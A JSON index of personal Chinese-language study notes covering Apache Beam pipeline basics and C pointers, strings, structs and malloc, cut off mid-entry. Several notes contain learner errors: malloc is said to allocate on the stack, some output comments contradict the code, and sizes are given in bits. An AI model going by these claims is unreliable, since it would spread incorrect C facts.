[
{
		"title": "Apache Beam 研究",
		"date":"Mon Jan 05 2026 05:34:04 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/Apache Beam/Apache Beam 研究/",
		"content": "#etl #apache-beam #pipeline\nExample code\nimport sys\n\nimport apache_beam as beam\n&quot;&quot;&quot;\n\n假設這是個用戶從什麼來源進來的資料\n\n&quot;&quot;&quot;\n\nsample_dataset = [\n\n\t{'id': '123', 'source': 'A'},\n\t\n\t{'id': '456', 'source': 'A'},\n\t\n\t{'id': '456', 'source': 'B'},\n\t\n\t{'id': '789', 'source': 'B'},\n\t\n\t{'id': '789', 'source': 'C'},\n\t\n\t{'id': '789', 'source': 'D'},\n\n]\n\nif __name__ == '__main__':\n\n\twith beam.Pipeline(argv=sys.argv) as pipeline:\n\n\t\t(\n\t\t\n\t\tpipeline\n\t\t\n\t\t| '資料初始化(轉為 pcollection)' &gt;&gt; beam.Create(sample_dataset)\n\t\t\n\t\t| '每行資料轉為 (source, 1)' &gt;&gt; beam.Map(lambda row: (row['source'], 1))\n\t\t\n\t\t| '同樣的 source 加總起來' &gt;&gt; beam.CombinePerKey(sum)\n\t\t\n\t\t| '轉換輸出的格式' &gt;&gt; beam.Map(lambda row: {'source': row[0], 'count': row[1]})\n\t\t\n\t\t| '寫入檔案' &gt;&gt; beam.io.WriteToText('sample-output')\n\t\t\n\t\t)",
		"tags": ["etl", "apache-beam", "pipeline", "note"]
},

{
		"title": "Apache Beam",
		"date":"Mon Jan 05 2026 05:34:04 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/Apache Beam/Apache Beam/",
		"content": "#etl #apache-beam #pipeline\nBasics of the Beam model\n\nApache Beam是一個統一的模型, 用於定義批處理和流式數據並行處理管道。要開始使用Beam, 您需要了解一組重要的核心概念：\n\nPipeline \n管道是用戶設定的轉換圖, 定義了所需的數據處理操作。\nPCollection\nPCollection - PCollection 是數據集或數據流。管道處理的數據是PCollection的一部分。\nPTransform \nPTransform - PTransform （或transform）表示管道中的數據處理操作或步驟。變換應用於零個或多個 PCollection 對象, 並產生零個或多個 PCollection 對象。\nWindow \n窗口 PCollection 可以根據各個元素的時間戳細分為窗口。通過將集合劃分為有限集合的窗口, 窗口支持對隨時間增長的集合進行分組操作。\n\nBounded vs. unbounded: Bounded vs. unbounded：\nPCollection\nPCollection 可以是有界的或無界的。\n\nA bounded PCollection is a dataset of a known\n有界的 PCollection 是一個已知的、固定大小的數據集（或者, 一個不隨時間增長的數據集）。有界數據可以通過批處理管道進行處理。\nAn unbounded PCollection is a dataset that grows over time\n無界的 PCollection 是一個隨時間增長的數據集, 數據在到達時被處理。無界數據必須通過流式管道處理。\n\n這兩個類別直覺的來自於批處理和流處理, 但這兩者在Beam中是統一的\n有界和無界PCollections可以在同一管道中共存。如果你的runner只能支持有界PCollection, 你必須拒絕包含無界PCollection的管道。如果你的runner只針對stream\n那麼Beam的支持代碼中有Adapter可以將所有內容轉換為針對無界(unbound)數據的API。\nPTransform\nPTransform （或transform）表示管道中的數據處理操作或步驟。變換通常應用於一個或多個輸入 PCollection 對象。\n您以函數對象的形式提供轉換處理邏輯（通俗地稱為「用戶代碼」）, 並且您的用戶代碼應用於輸入PCollection（或多個PCollection）的每個元素。根據您選擇的管道運行器和後端, 集群中的許多不同工作者可能會並行執行用戶代碼的實例。在每個worker上運行的用戶代碼生成輸出元素, 這些元素被添加到零個或多個輸出 PCollection 對象。\n\nSource transforms\n如 TextIO.Read 和 Create 。\nProcessing and conversion operations\n處理和轉換操作, 如 ParDo 、 GroupByKey 、 CoGroupByKey 、 Combine 和 Count 。\nOutputting transforms\n輸出轉換, 如 TextIO.Write 。\nUser-defined,\n用戶定義的、特定於應用程式的複合轉換。\n\n自定義函數\n某些Beam操作允許您運行用戶定義的代碼作為配置轉換的一種方式。例如, 當使用 ParDo 時, 用戶定義的代碼指定對每個元素應用什麼操作。對於 Combine , 它指定應該如何組合值。通過使用跨語言轉換, Beam管道可以包含用不同語言編寫的UDF, 甚至可以在同一管道中包含多種語言。\nBeam有幾種UDF：\n舉常用的為例\n\nDoFn \nDoFn -每元素處理函數（用於 ParDo ）\n\nRunner\nBeam運行器在特定平台上運行Beam管道。大多數runner都是大規模並行大數據處理系統的翻譯器或適配器, 例如Apache Flink, Apache Spark, Google Cloud Dataflow等。\n例如, Flink runner將Beam管道轉換為Flink作業。Direct Runner在本地運行管道, 這樣您就可以測試、調試和驗證管道是否儘可能接近Apache Beam模型。\n有關Runner的更多信息, 請參閱以下頁面：\n\nChoosing a Runner\nBeam Capability Matrix\n\nWindow 窗口\n根據其各個元素的時間戳將 PCollection 細分為窗口。通過將集合劃分為有限集合的窗口, 窗口支持對無界集合的分組操作。\nex:\n\nFixed time windows\n固定時間窗口, 表示數據流中持續時間一致、不重疊的時間間隔。\n\n8.2.1.Fixed time windows(固定時間窗口)\n最簡單的窗口形式是使用固定時間窗口：給定可能連續更新的帶時間戳的 PCollection , 每個窗口可以捕獲（例如）具有落入30秒間隔的時間戳的所有元素。\n固定時間窗口表示數據流中的一致持續時間、非重疊時間間隔。考慮持續時間為30秒的窗口：在unbounded PCollection 中, 所有時間戳值從0：00：00到（但不包括）0：00：30的元素都屬於第一個窗口, 時間戳值從0：00：30到（但不包括）0：01：00的元素屬於第二個窗口, 依此類推。",
		"tags": ["etl", "apache-beam", "pipeline", "note"]
},

{
		"title": "C 語言 pass by value",
		"date":"Mon Jan 05 2026 05:34:04 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/C 語言學習/C 語言 pass by value/",
		"content": "C 語言沒有 pass by reference, 只有 pass by value，這是語言特性\n就算是 pointer 也是 pass by value\n若要實現 pass by reference, 需借助指針的功能\n#include &lt;string.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nvoid setNum(int *p)\n{\n*p = 10; // 解引用後修改其值\n}\nint main()\n{\nint a=100;\nprintf(&quot;a: %d\\n&quot;, a); // 100\nsetNum(&amp;a); // 將 a 的地址傳進 function\nprintf(&quot;a: %d\\n&quot;, a); // 10\n}",
		"tags": ["include", "include", "include", "note","C-lang"]
},

{
		"title": "malloc 內存分配 - void 指針",
		"date":"Mon Jan 05 2026 05:34:04 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/C 語言學習/malloc 內存分配 - void 指針/",
		"content": "#include &lt;string.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\n// 無類型指針\n\n// 結構體指針\nint main()\n{\nint x = 10;\nint *p = &amp;x;\nprintf(&quot;%d\\n&quot;, *p);\n\n// 無類型的指針變數可以與其他類型的指針相賦值\nvoid *q = &amp;x; // 無類型指針\nq = p;\nint *r = q;\ndouble *s = q;\n\n// int y = *q; // 無法解讀 void 指針類型的數據\nint y = *((int *)q); // 強制轉型\nprintf(&quot;%d\\n&quot;, *r);\nprintf(&quot;%d\\n&quot;, y);\nprintf(&quot;%f\\n&quot;, *s); // 不要嘗試讀取其他類型的指針，會導致不可預期的行為\n}",
		"tags": ["include", "include", "include", "note","C-lang"]
},

{
		"title": "malloc 內存分配",
		"date":"Mon Jan 05 2026 05:34:04 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/C 語言學習/malloc 內存分配/",
		"content": "malloc\n函數原型\nvoid *malloc(unsigned int size); // size 類型為無符號整型\n\n無符號整型 = 0 or 正整數\n因為少了負數，可以將所有位元用於顯示正整數\nmalloc 函數返回的是一個指針，所以他是一個指針函數\n作用: 在內存的動態儲存區(stack 區) 中分配一個長度為 size 的連續空間，並將該空間的首地址做為函數值返回，即此函數為指針函數",
		"tags": [ "note","C-lang"]
},

{
		"title": "二級指針(多重指針)",
		"date":"Mon Jan 05 2026 05:34:04 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/C 語言學習/二級指針(多重指針)/",
		"content": "例題 1:\n// 野指針\n#include &lt;stdio.h&gt;\nint main(){\nint num = 10;\nint *p1 = &amp;num; // p1 指向 num 的地址\nint *p2 = p1; // p2 也指向 num 的地址（與 p1 相同）\nprintf(&quot;%p\\n&quot;, p1); // 輸出 p1（num 的地址）\nprintf(&quot;%p\\n&quot;, p2); // 輸出 p2（num 的地址，與 p1 相同）\n\n// 故，p2 不是二級指針，因為他還是指向 p1 的 num 地址\n\n// 記憶體示意圖\n// 記憶體地址 變數 值\n// 0x1000 num 10\n// 0x2000 p1 0x1000 (num的地址)\n// 0x3000 p2 0x1000 (複製p1的值，也是num的地址)\nreturn 0;\n}\n\n// execute:\n// clang PointerTest-4.c -o PointerTest-4 &amp;&amp; ./PointerTest-4\n\n例題 2:\n// 二重指針\n#include &lt;stdio.h&gt;\nint main(){\nint num = 10;\nint *p1 = &amp;num; // p1 指向 num 的地址\nint *p2 = p1; // p2 也指向 num 的地址（與 p1 相同）\nprintf(&quot;%p\\n&quot;, p1); // 輸出 p1（num 的地址）\nprintf(&quot;%p\\n&quot;, p2); // 輸出 p2（num 的地址，與 p1 相同）\n*p2 = 100; // 將 p2 所在的位址的值改為 100\nprintf(&quot;%d\\n&quot;, *p2); // 100\nprintf(&quot;num: %d\\n&quot;, num); // 因為 p2 取的是 num 的位址，當 *p2 賦值時，其實是修改 num 所在記憶體空間的值\nreturn 0;\n}\n\n// 二級指針\n#include &lt;stdio.h&gt;\nint main(){\nint a = 10;\nint *p3 = &amp;a;\n\n// 如何聲明二級指針\n// 但是此時 p4 定義的二級指針寫法錯誤\nint *p4 = &amp;p3;\nprintf(&quot;%p\\n&quot;, p3); // 0x16b74aadc\nprintf(&quot;%p\\n&quot;, &amp;p3); // 0x16b74aad0\nprintf(&quot;%p\\n&quot;, p4); // 0x16b74aad0\nprintf(&quot;%p\\n&quot;, &amp;p4); // 0x16f05eac8(p4 的地址)\n\n// 正確的定義二級指針語法\nint **p5 = &amp;p3;\nprintf(&quot;%d\\n&quot;, *p5); // 1868049116\nprintf(&quot;%d\\n&quot;, **p5); // 10(正確， **p5 = p3 指針所指向的 a 的值)\n\n**p5 = 100;\nprintf(&quot;%d\\n&quot;, **p5); // 10(正確， **p5 = p3 指針所指向的 a 的值)\nprintf(&quot;%d\\n&quot;, a); // 10(正確，**p5 = p3 指針所指向的 a 的值)\n}\n\n// execute:\n// clang PointerTest-4.c -o PointerTest-4 &amp;&amp; ./PointerTest-4\n\n二級指針只能由指針賦值，不能直接拿地址賦值\n// 舉例 1:\nint b = 5;\nint **p1 = &amp;b; // 這裡出錯，因為 b 是 int 類型，就算 &amp;b 也是取 int 的地址，但 **p1 是二級指針\n\n// 正確\nint b = 5;\nint *pp0 = &amp;b; // 需要經過一個轉換，轉換成指針形態才能賦值給二級指針\nint **p1 = &amp;pp0;\nprintf(&quot;%d\\n&quot;, **p1);\n\n多級指針解引用\n\n// 二級指針 -&gt; 多級指針\n#include &lt;stdio.h&gt;\nint main(){\nint var = 5;\nint *ptr = &amp;var;\nprintf(&quot;%d\\n&quot;, *ptr);\nint **pptr = &amp;ptr; // 二級指針\nprintf(&quot;%d\\n&quot;, **pptr);\nint ***ppptr = &amp;pptr; // 三級指針\nprintf(&quot;%d\\n&quot;, ***ppptr); // 三級指針解引用\n\n***ppptr = 100; // 其實修改的是 var 的變數值\n// 所有引用這個地址的值都被修改了\nprintf(&quot;%d\\n&quot;, *ptr);\nprintf(&quot;%d\\n&quot;, **pptr);\nprintf(&quot;%d\\n&quot;, ***ppptr);\n\n}\n\n// execute:\n// clang PointerTest-4.c -o PointerTest-4 &amp;&amp; ./PointerTest-4",
		"tags": ["include", "include", "include", "include", "note","C-lang"]
},

{
		"title": "同類指針相減運算",
		"date":"Mon Jan 05 2026 05:34:04 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/C 語言學習/同類指針相減運算/",
		"content": "#include &lt;stdio.h&gt;\nint main(){\nint arr[5] = {1, 3, 5, 7, 9};\n\n// 使用 &amp; 運算符，提取 arr[0] 的地址存入指針變數 p1\nint *p1 = &amp;arr[0];\nint *p2 = &amp;arr[3];\nprintf(&quot;%d\\n&quot;, *p1); // 1\nprintf(&quot;%d\\n&quot;, *p2); // 7\nprintf(&quot;%d\\n&quot;, *p2-*p1); // 用 * 運算符取 p2、p1 指針值做相減(7-1=6)\nprintf(&quot;%d\\n&quot;, p1); // 指針相減 p2-p1 相差 14\nprintf(&quot;%d\\n&quot;, p2); // 指針相減 p2-p1 相差 14\nprintf(&quot;%d\\n&quot;, p2 - p1); // 指針相減 p2-p1 相差 12 個 byte (1807002288-1807002300 = 12)/4bit(int 長度) = 3 個元素的距離\nreturn 0;\n}\n\n// execute: clang PointerTest-2.3.3.c -o PointerTest-2.3.3 &amp;&amp; ./PointerTest-2.3.3\n\n&amp; 與 * 差異\n&amp; -&gt; 從「變數」取址運算符\n* -&gt; 從「指針」取值運算符\n\nAB 兩個選想是因為 scanf 需要以 &amp; 作為賦值\n賦值練習題",
		"tags": ["include", "note","C-lang"]
},

{
		"title": "字符數組",
		"date":"Mon Jan 05 2026 05:34:04 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/C 語言學習/字符數組/",
		"content": "#include &lt;stdio.h&gt;\n\nint main()\n{\n/*\nC 語言裡面沒有 string 的型別，需要以 char array 的方式實現\n所有字符數組必須以 \\0 作為結尾\n且字符串末尾的 \\0 會佔一個 bytes，計算 length 需注意 n(字符串數量) + 1\n*/\n//字符數組必須以 \\0 作為結尾\nchar arr[] = {'a', 'b', 'c', 'd', '\\0'};\n\n// 標準寫法\nchar str1[] = {'h', 'e', 'l', 'l', 'o', 'w', '\\0'};\n\n// 簡化\n// length = string 數量(11) + '\\0'(1) 的數量共 12 個\nchar str2[12] = {&quot;hello world&quot;}; // 注意使用雙引號，非單引號\n\n// 進一步簡化\nchar str3[] = {&quot;hello world&quot;};\nchar str4[] = &quot;hello world&quot;;\n\nsize_t str_size = sizeof(str4) / sizeof(char);\nprintf(&quot;%d\\n&quot;, str_size); // 字符串長度 12\n}\n\n區分: '\\0', 0, '0'\n#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nint main()\n{\n// 區分: '\\0', 0, '0'\nprintf(&quot;%d\\n&quot;, '\\0' == 0); // true\nprintf(&quot;%d\\n&quot;, '0' == '\\0'); // false\nprintf(&quot;%d\\n&quot;, '0' == 0); // false\n}\n\n單雙引號區別\n如果用 &quot;x&quot; 宣告字符串變數，C 語言就會自動補 \\0\n如果用 'x' 宣告字符串變數，C 語言不會自動補 \\0，但用 'x' 宣告的字符串可以進行ASCII加減法\n#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nint main()\n{\nchar char1[] = &quot;x&quot;; // 常量，會自動補 \\0 結束符\nchar char2[] = {'x'}; // 字符，必須手動補 \\0 結束符\n// &quot;x&quot; 與 'x' 字節佔用量\nprintf(&quot;%d\\n&quot;, (sizeof(char1) / sizeof(char))); // 2，含結束符 \\0\nprintf(&quot;%d\\n&quot;, (sizeof(char2) / sizeof(char))); // 1，不含結束符 \\0\n}\n\nchar 字符 ASCII 運算\n#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nint main()\n{\nchar char1[] = &quot;x&quot;; // 常量，會自動補 \\0 結束符\nchar char2[] = {'x'}; // 字符，必須手動補 \\0 結束符\n// &quot;x&quot; 與 'x' 字節佔用量\nprintf(&quot;%d\\n&quot;, (sizeof(char1) / sizeof(char))); // 2，含結束符 \\0\nprintf(&quot;%d\\n&quot;, (sizeof(char2) / sizeof(char))); // 1，不含結束符 \\0\n\n// %c 用於輸出一個 char 字符\nprintf(&quot;%c\\n&quot;, 'x'+1); // char 運算，+1 後會變成 y\nprintf(&quot;%c\\n&quot;, 65); // 輸出 A, 因為(ASCII 65 = 'A')\nprintf(&quot;%c\\n&quot;, 'A'+1); // 輸出 B, 因為(ASCII 65 = 'A')+1 = (ASCII 66 = 'B')\n}",
		"tags": ["include", "include", "include", "include", "include", "include", "include", "note","C-lang"]
},

{
		"title": "指針的自增自減運算",
		"date":"Mon Jan 05 2026 05:34:04 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/C 語言學習/指針的自增自減運算/",
		"content": "#include &lt;stdio.h&gt;\nint main(){\nint arr[5] = {1, 2, 3, 4, 5};\n\n// 以下兩種寫法相等\n// int *p = arr; // 取 arr 首地址存入 pointer p\nint *p = &amp;arr[0]; // &amp; 取地址，並賦值到 *p\np++; // 使 p 指向下一個元素\nprintf(&quot;%d\\n&quot;, *p);\nreturn 0;\n}\n\n運算子結合是由右往左結合\n#include &lt;stdio.h&gt;\nint main(){\nint arr[5] = {1, 3, 5, 7, 9};\n\n// 以下兩種寫法相等\n// int *p = arr; // 取 arr 首地址存入 pointer p\nint *p = &amp;arr[0]; // &amp; 取地址，並賦值到 *p -&gt; 1\np++; // 使 p 指向下一個元素 -&gt; 3\nprintf(&quot;%d\\n&quot;, *p); // 3\nprintf(&quot;%d\\n&quot;, *p++); //取值後輸出，並往後移動 4 個 bit -&gt; 3\nprintf(&quot;%d\\n&quot;, *p); // 重新取用一次 p 的值 -&gt; 5\n// *++p 運算子是由右往左結合，故等同於 *(++p)\n// ++p 為 7，*++p = 取 p 值 = 7\nprintf(&quot;%d\\n&quot;, *++p); // 再移動指針增加 4 bit, 並取值 p -&gt; 7\n// ++*p = ++(*p) 取 *p 值並 +1(由右往左結合)\nprintf(&quot;%d\\n&quot;, ++*p); // 取指針 p 的值(7)，並將該值 + 1 -&gt; 8\n\nreturn 0;\n}",
		"tags": ["include", "include", "note","C-lang"]
},

{
		"title": "數組反轉操作",
		"date":"Mon Jan 05 2026 05:34:04 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/C 語言學習/數組反轉操作/",
		"content": "#include &lt;stdio.h&gt;\n\nint main()\n{\n// 一維數組反轉操作\nint arr[] = {0,1,2,3,4,5,6,7,8,9};\nsize_t LENGTH = sizeof(arr) / sizeof(int);\nint tmp = 0;\n// for (int i=0; i &lt; (LENGTH/2); i++)\n// {\n// tmp = arr[i];\n// arr[i] = arr[LENGTH-1-i];\n// arr[LENGTH-1-i] = tmp;\n// }\n\n// 反轉實現方式 2\nfor (int left = 0, right = LENGTH-1;left &lt; right;left++, right--)\n{\nint tmp = arr[left];\narr[left] = arr[right];\narr[right] = tmp;\n}\nfor (int i=0; i &lt; LENGTH; i++)\n{\nprintf(&quot;--%d\\n&quot;, arr[i]);\n}\n\n}",
		"tags": ["include", "note","C-lang"]
},

{
		"title": "結構體指針傳遞練習題 1",
		"date":"Mon Jan 05 2026 05:34:04 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/C 語言學習/結構體指針傳遞練習題 1/",
		"content": "#include &lt;string.h&gt;\n#include &lt;stdio.h&gt;\n/*結構體傳參*/\n// 聲明一個結構體\nstruct Dog\n{\nchar name[20];\nint age;\ndouble weight;\n};\n\n// 只能在這邊聲明返回指針\n// 陣列在表達式中會自動轉換為指針\nchar *say(struct Dog dog){\nstatic char info[100]; // 需要將局部變量，宣告為 static, 確保在 say 函數運行後，不會銷毀\nsprintf(info, &quot;Name: %s, Age: %d, Weight: %.2lf&quot;, dog.name, dog.age, dog.weight);\nreturn info; //實際是返回陣列的[0] 位置的指針\n}\n\n// 方式 2, 指針傳遞\nchar *say1(struct Dog *dog_ptr){\nstatic char info[100]; // 需要將局部變量，宣告為 static, 確保在 say 函數運行後，不會銷毀\n(*dog_ptr).age = (*dog_ptr).age + 1;\nsprintf(info, &quot;Name: %s, Age: %d, Weight: %.2lf&quot;, (*dog_ptr).name, (*dog_ptr).age, (*dog_ptr).weight);\nreturn info; //實際是返回陣列的[0] 位置的指針\n}\n\n// 結構體指針\nint main()\n{\n// 聲明結構體變量，並初始化\nstruct Dog myDog;\nstrcpy(myDog.name, &quot;大黃&quot;);\nmyDog.age = 2;\nmyDog.weight = 2.3;\n\nchar *result = say(myDog);\nprintf(&quot;info=%s\\n&quot;, result);\n\nchar *result2 = say1(&amp;myDog);\nprintf(&quot;info=%s\\n&quot;, result2);\nreturn 0;\n}",
		"tags": ["include", "include", "note","C-lang"]
},

{
		"title": "結構體指針變數使用",
		"date":"Mon Jan 05 2026 05:34:04 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/C 語言學習/結構體指針變數使用/",
		"content": "#include &lt;string.h&gt;\n#include &lt;stdio.h&gt;\n\n// 聲明一個結構體\nstruct Person\n{\nchar name[20];\nint age;\n};\n\n// 結構體指針\nint main()\n{\nstruct Person per1 = {.name=&quot;Tom&quot;, .age=12};\nstruct Person *per_ptr = &amp;per1;\n\n// 兩者等價\n(*per_ptr).age = 20;\nper_ptr-&gt;age = 30;\n\nprintf(&quot;name: %s\\n&quot;, (*per_ptr).name);\nprintf(&quot;age: %d\\n&quot;, (*per_ptr).age);\n\n}",
		"tags": ["include", "include", "note","C-lang"]
},

{
		"title": "結構體指針變數傳遞",
		"date":"Mon Jan 05 2026 05:34:04 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/C 語言學習/結構體指針變數傳遞/",
		"content": "#include &lt;string.h&gt;\n#include &lt;stdio.h&gt;\n/*結構體傳參*/\n// 聲明一個結構體\nstruct Person\n{\nchar name[20];\nint age;\n};\n\nvoid addAge(struct Person per){\n// 實際傳入的是結構體的副本\nper.age = per.age + 1;\n}\nvoid addAge1(struct Person *per){\n// 修改的是指針裡面的值\nper-&gt;age = per-&gt;age + 1;\n}\n\n// 結構體指針\nint main()\n{\nstruct Person per1 = {.name=&quot;Tom&quot;, .age=13};\n// 實際傳入的是結構體的副本，pass by value\naddAge(per1);\nprintf(&quot;name: %s\\n&quot;, per1.name);\nprintf(&quot;age: %d\\n&quot;, per1.age);\n\n// 傳入結構體的指針，pass by reference\naddAge1(&amp;per1);\nprintf(&quot;name: %s\\n&quot;, per1.name);\nprintf(&quot;age: %d\\n&quot;, per1.age);\n}",
		"tags": ["include", "include", "note","C-lang"]
},

{
		"title": "結構體數組訪問",
		"date":"Mon Jan 05 2026 05:34:04 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/C 語言學習/結構體數組訪問/",
		"content": "#include &lt;string.h&gt;\n#include &lt;stdio.h&gt;\n\nstruct Person\n{\nchar name[20];\nint age;\n};\n\nint main()\n{\n// 1. 創建結構體數組\nstruct Person p_arr[5];\n\n// 2. 如何給結構體數組的元素賦值\nstrcpy(p_arr[0].name, &quot;Jason&quot;);\np_arr[0].age = 5;\nstrcpy(p_arr[1].name, &quot;Jason111&quot;);\np_arr[0].age = 6;\nstrcpy(p_arr[2].name, &quot;Jason222&quot;);\np_arr[0].age = 7;\n//3. 如何調用數組的元素，即結構體內部的成員\n\nprintf(&quot;p_arr[0].name: %s\\n&quot;, p_arr[0].name);\nprintf(&quot;p_arr[1].name: %s\\n&quot;, p_arr[1].name);\nprintf(&quot;p_arr[2].name: %s\\n&quot;, p_arr[2].name);\n\n/*聲明方式 2*/\n// 1. 創建結構體數組\nstruct Person p_arr2[]={ {.name=&quot;John&quot;, .age=1},\n{.name=&quot;John1&quot;, .age=2},\n{.name=&quot;Joh2&quot;, .age=3}};\n\nprintf(&quot;p_arr2[0].name: %s\\n&quot;, p_arr2[0].name);\nprintf(&quot;p_arr2[1].name: %s\\n&quot;, p_arr2[1].name);\nprintf(&quot;p_arr2[2].name: %s\\n&quot;, p_arr2[2].name);\n\n/*使用指向數組的指針*/\nstruct Person *ptrPerson;\n\n// 取得第 0 個結構體的指針參考\nptrPerson = &amp;p_arr[0];\nprintf(&quot;ptrPerson.name: %s\\n&quot;, ptrPerson-&gt;name);\n}",
		"tags": ["include", "include", "note","C-lang"]
},

{
		"title": "結構體複製 - pass by value",
		"date":"Mon Jan 05 2026 05:34:04 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/C 語言學習/結構體複製 - pass by value/",
		"content": "#include &lt;string.h&gt;\n#include &lt;stdio.h&gt;\n\nstruct Car\n{\nchar name[30];\ndouble price;\n} a = {.name=&quot;audi AAA&quot;, .price=100};\n\nint main()\n{\n// 複製行為\nstruct Car b = a; // 結構體複製是 pass by value\nprintf(&quot;a: %p\\n&quot;, &amp;a);\nprintf(&quot;b: %p\\n&quot;, &amp;b); // 地址不同\n\nprintf(&quot;a =&gt; name: %s, price: %f\\n&quot;, a.name, a.price); // 值是一樣\nprintf(&quot;b =&gt; name: %s, price: %f\\n&quot;, b.name, b.price); // 值是一樣\n\n}\n\n結構體的複製是 pass by value\n\nprintf(&quot;%p\\n&quot;, &amp;a.name) 輸出的是自己的變數地址\nprintf(&quot;%p\\n&quot;, a.name) 輸出指針變數指向的變數地址\n在 C 語言中，字符串屬於常量，只要定義一個字符串 &quot;Hello&quot;, 不管後續誰指向，都是指到同個記憶體位置\n#include &lt;string.h&gt;\n#include &lt;stdio.h&gt;\n\nstruct Car\n{\nchar *name;\ndouble price;\n} a = {.name=&quot;audi AAA&quot;, .price=100};\n\nint main()\n{\n// 複製行為\nstruct Car b = a; // 結構體複製是 pass by value，會產生新地址\nprintf(&quot;a: %p\\n&quot;, &amp;a);\nprintf(&quot;b: %p\\n&quot;, &amp;b); // 地址不同\n\n/*\n結構體本身複製的是值，當值是指針變數時，複製的是該指針變數指向的地址\n*/\nprintf(&quot;a =&gt; name: %p, price: %p\\n&quot;, &amp;a.name, &amp;a.price); // &amp;a.name 顯示指針變數的地址 a =&gt; name: 0x102480000, price: 0x102480008\nprintf(&quot;b =&gt; name: %p, price: %p\\n&quot;, &amp;b.name, &amp;b.price); // &amp;b.name 顯示指針變數的地址 b =&gt; name: 0x16d986a10, price: 0x16d986a18\nprintf(&quot;a =&gt; name: %p, price: %f\\n&quot;, a.name, a.price); // a.name 指向的變數地址 a =&gt; name: 0x102478600, price: 100.000000\nprintf(&quot;b =&gt; name: %p, price: %f\\n&quot;, b.name, b.price); // b.name 指向的變數地址 b =&gt; name: 0x102478600, price: 100.000000\n\n}",
		"tags": ["include", "include", "include", "include", "note","C-lang"]
},

{
		"title": "結構體訪問 - 課後練習",
		"date":"Mon Jan 05 2026 05:34:04 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/C 語言學習/結構體訪問 - 課後練習/",
		"content": "題目:\n輸入班級所有學生的成績，輸出成績高於平均的學生姓名與分數\n#include &lt;string.h&gt;\n#include &lt;stdio.h&gt;\n#define LENGTH 4\n// 需求: 輸入班級學生訊息\nstruct Student\n{\nint id;\nchar name[20];\nchar gender;\nint score;\n};\n\nint main()\n{\n// 聲明學生的結構體數組\nstruct Student student_arr[LENGTH] = {{.id=1, .name=&quot;alice&quot;, .gender='M', .score=60},\n{.id=2, .name=&quot;bob&quot;, .gender='F', .score=65},\n{.id=3, .name=&quot;hoho&quot;, .gender='F', .score=70},\n{.id=4, .name=&quot;doe&quot;, .gender='M', .score=80}};\nint score_sum = 0;\nfor (int i = 0; i &lt; LENGTH; i++){\nprintf(&quot;score: %d\\n&quot;, student_arr[i].score);\nscore_sum += student_arr[i].score;\n}\nint avg_score = score_sum/LENGTH;\nprintf(&quot;avg_score: %d\\n&quot;, avg_score);\nfor (int i = 0; i &lt; LENGTH; i++){\nif (student_arr[i].score &gt; avg_score){\nprintf(&quot;name: %s, score: %d\\n&quot;, student_arr[i].name, student_arr[i].score);\n}\n}\n}\n\noutput:\n\tscore: 60\n\tscore: 65\n\tscore: 70\n\tscore: 80\n\tavg_score: 68\n\tname: hoho, score: 70\n\tname: doe, score: 80",
		"tags": ["include", "include", "define", "note","C-lang"]
},

{
		"title": "聲明結構體練習",
		"date":"Mon Jan 05 2026 05:34:04 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/C 語言學習/聲明結構體練習/",
		"content": "#include &lt;string.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\n/*結構體傳參*/\n// 聲明一個結構體\nstruct Node\n{\nint data;\nstruct Node *next; // 指向 Node 型變數的指針\n};\n\n// 或是如下定義\ntypedef struct Node1\n{\nint data;\nstruct Node *next;\n}LNode;\n\n// 聲明二叉樹的節點\n// 方式 1\nstruct BTNode\n{\nint data;\nstruct BTNode *lchild; // 指向左子樹\nstruct BTNode *rchild; // 指向右子樹\n\n};\n\n// 方式 2\ntypedef struct BTNode1\n{\nint data;\nstruct BTNode1 *lchild; // 指向左子樹\nstruct BTNode1 *rchild; // 指向右子樹\n\n}BTNode1;\n\n// 結構體指針\nint main()\n{\n// 聲明節點變量的不同方式\n// 方式 1:\n// 聲明單向鍊表的節點\nstruct Node node1;\nLNode node2;\n\n// 聲明二叉樹的節點\nstruct BTNode btnode1;\nBTNode1 btnode2;\n\n// 方式 2:\nBTNode1 *node5;\n\n// 動態開闢 BTNode1 大小的空間\n// (BTNode1 *) 強制轉型為 BTNode1 類型\nnode5 = (BTNode1 *)malloc(sizeof(BTNode1));\nfree(node5); // 釋放 node5 空間\nreturn 0;\n}",
		"tags": ["include", "include", "include", "note","C-lang"]
},

{
		"title": "野指針",
		"date":"Mon Jan 05 2026 05:34:04 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/C 語言學習/野指針/",
